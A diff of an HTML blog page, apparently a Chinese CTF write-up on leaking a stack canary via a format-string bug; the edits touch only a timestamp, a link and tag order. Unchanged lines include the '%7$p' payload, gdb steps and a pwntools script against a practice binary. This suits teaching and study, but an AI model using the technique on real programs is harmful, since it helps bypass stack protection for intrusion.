@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/4.png">
 <meta property="og:image" content="http://example.com/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/5.png">
 <meta property="article:published_time" content="2021-10-31T15:26:30.000Z">
-<meta property="article:modified_time" content="2021-11-01T12:28:22.105Z">
+<meta property="article:modified_time" content="2021-11-01T12:30:02.817Z">
 <meta property="article:author" content="LianFeiyang">
 <meta property="article:tag" content="PWN">
 <meta property="article:tag" content="格式化字符串漏洞">
@@ -193,7 +193,7 @@
 <h5 id="0-2-泄露任意参数"><a href="#0-2-泄露任意参数" class="headerlink" title="0-2.泄露任意参数"></a>0-2.泄露任意参数</h5><p>假如我们知道在函数调用的过程中某参数是第k个传入的，那么要输出该参数的值，则可利用如下方式：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%k$p&quot;</span>);</span><br></pre></td></tr></table></figure>
 <p>按照这种道理，假如我们知道了canary在函数中的是第几个被传入的，则可以通过上述方法泄露canary。</p>
-<h4 id="1-例子"><a href="#1-例子" class="headerlink" title="1.例子"></a>1.例子</h4><p>本题用到的ELF：<a href=".bc">点击下载</a><br>查看IDA：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/1.png"><br>发现明显的格式化字符串漏洞。利用此处泄露canary。<br>用gdb进行动态调试，在func_a()处下断点：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/2.png"><br>按r运行，再按n直到运行到call read处：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/3.png"><br>输入canary查看其值，再输入stack查看栈。<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/4.png"><br>可以看出在栈中偏移量为0008、0024、0056处都存有canary的值。这里考虑泄露0008处。<br>我们知道，64位Linux中函数前6个参数靠寄存器传值，之后的参数才会压入栈中。因此我们需要泄露的是第6+8/8=7个参数。<br>因此exp可以这样写：</p>
+<h4 id="1-例子"><a href="#1-例子" class="headerlink" title="1.例子"></a>1.例子</h4><p>本题用到的ELF：<a href="bc">点击下载</a><br>查看IDA：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/1.png"><br>发现明显的格式化字符串漏洞。利用此处泄露canary。<br>用gdb进行动态调试，在func_a()处下断点：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/2.png"><br>按r运行，再按n直到运行到call read处：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/3.png"><br>输入canary查看其值，再输入stack查看栈。<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/4.png"><br>可以看出在栈中偏移量为0008、0024、0056处都存有canary的值。这里考虑泄露0008处。<br>我们知道，64位Linux中函数前6个参数靠寄存器传值，之后的参数才会压入栈中。因此我们需要泄露的是第6+8/8=7个参数。<br>因此exp可以这样写：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./bc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;canary &#x27; s @ # $ % ^ &amp; * :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">Canary=<span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;00&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 <p>执行完的效果如下图：<br><img src="/2021/10/31/%E6%B5%85%E8%B0%88%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%B3%84%E9%9C%B2canary/5.png"><br>可以看出成功泄露了canary。</p>
 
@@ -556,6 +556,10 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">解题思路</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">格式化字符串漏洞</a>
               </li>
              
@@ -564,15 +568,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">解题思路</a>
+                <a href="javascript:void(0)" class="js-tag color3">测试</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">栈转移</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">测试</a>
               </li>
             
             <div class="clearfix"></div>
